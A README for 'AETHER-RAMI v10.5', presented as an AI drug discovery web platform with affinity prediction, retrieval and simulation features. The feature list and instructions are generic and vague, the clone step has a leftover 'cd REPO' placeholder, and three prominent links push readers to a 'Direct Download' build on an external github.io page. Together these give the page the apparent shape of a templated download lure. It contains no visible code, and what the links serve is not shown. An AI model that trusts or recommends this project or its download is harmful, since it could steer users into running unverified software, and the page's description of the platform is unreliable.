# AETHER-RAMI v10.5 - AI-powered drug discovery platform 2026

> **A protein-aware drug discovery platform for web-based workflows, uniting foundation models, protein-ligand learning, and affinity prediction in version 10.5.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v10.5-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/logan-edwardsgap9624/aether-rami-v10-5?style=flat-square)](https://github.com/logan-edwardsgap9624/aether-rami-v10-5)

---

<p align="center">
  <a href="https://logan-edwardsgap9624.github.io/aether-rami-v10-5/">
    <img src="https://img.shields.io/badge/Download-AETHER-RAMI%20Latest-brightgreen?style=for-the-badge" alt="Download AETHER-RAMI">
  </a>
</p>

> **[Direct Download - AETHER-RAMI v10.5](https://logan-edwardsgap9624.github.io/aether-rami-v10-5/)**

---

[Download Latest Build](https://logan-edwardsgap9624.github.io/aether-rami-v10-5/)

---

## Overview

AETHER-RAMI is a browser-based AI environment built for drug discovery with protein-aware modeling at its foundation. It combines foundation-model concepts, graph neural network pipelines, and protein-ligand learning so researchers can examine candidate molecules and interaction behavior in a more organized workflow.

This platform is aimed at teams and scientists who want one interface for affinity prediction, molecular generation, retrieval-based repurposing, and model interpretation. Backed by FastAPI and Next.js, AETHER-RAMI serves as an interactive discovery workspace instead of splitting each stage across separate tools.

---

## What it offers

- Protein-aware molecular foundation modeling for discovery workflows
- Protein-ligand learning for drug-target interaction analysis
- Cross-attention-based affinity prediction
- Molecular generation and lead optimization support
- FAISS-backed vector retrieval for repurposing-oriented search
- SHAP-based explainability for model interpretation
- PK/PD digital twin simulation for exploratory analysis
- Active learning with BALD to guide next-step selection

---

## Installation

AETHER-RAMI is shipped as a web application. In a standard setup, you clone the repository or fetch the latest build, then launch the backend and frontend services for local use.

1. Clone the repository:
   ```bash
   git clone https://github.com/logan-edwardsgap9624/aether-rami-v10-5.git
   cd REPO
   ```

2. Start the application according to the project layout:
   - Backend: FastAPI service
   - Frontend: Next.js app

3. Open the local web interface in your browser once both services are running.

If you are using a published build, use the download link above and follow the included run instructions for that package.

---

## Typical workflow

AETHER-RAMI is organized around discovery tasks that begin with a target context and move toward candidate evaluation.

Typical workflow:
1. Load or define a protein-target context.
2. Run protein-ligand interaction modeling.
3. Review affinity predictions and cross-attention outputs.
4. Generate or refine candidate molecules.
5. Use retrieval to surface related compounds or repurposing leads.
6. Inspect explainability results with SHAP.
7. Explore PK/PD behavior through the digital twin module.
8. Apply active learning to prioritize the next batch of experiments or candidates.

Example usage pattern:
- Select a target protein
- Submit one or more ligands or molecular prompts
- Compare predicted affinity and generated outputs
- Review interpretation and simulation views before moving forward

---

## Configuration

Application settings are expected to be defined in the configuration used by the FastAPI backend and Next.js frontend. The exact filenames may differ by deployment, but environment variables and app-level configuration files are common places to look.

Example environment-style settings:
```bash
API_BASE_URL=http://localhost:8000
FRONTEND_BASE_URL=http://localhost:3000
FAISS_INDEX_PATH=./data/faiss
MODEL_DIR=./models
```

If you change model paths, retrieval indexes, or simulation parameters, update the corresponding backend configuration before launching the app.

---

## Requirements

- Web browser for the user interface
- Modern JavaScript runtime for the Next.js frontend
- Python environment for the FastAPI backend
- Storage for models, vector indexes, and simulation data
- Local or hosted environment capable of running AI workloads used by the platform

---

## FAQ

**How do I get the latest version?**  
Use the download link above to access the current build or follow the repository release flow if one is available.

**Where do I change settings?**  
Look for environment variables or backend/frontend config files that define API endpoints, model paths, and retrieval resources.

**What should I do if the app will not start?**  
Check that both backend and frontend dependencies are installed, verify your runtime versions, and confirm that required paths such as model or FAISS index locations exist.

**Can I update the model or retrieval data?**  
Yes, but you should review the project configuration and restart the relevant services after replacing model files or vector indexes.

**Who is this for?**  
It is intended for research and development workflows centered on protein-aware drug discovery, candidate generation, and interaction analysis.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
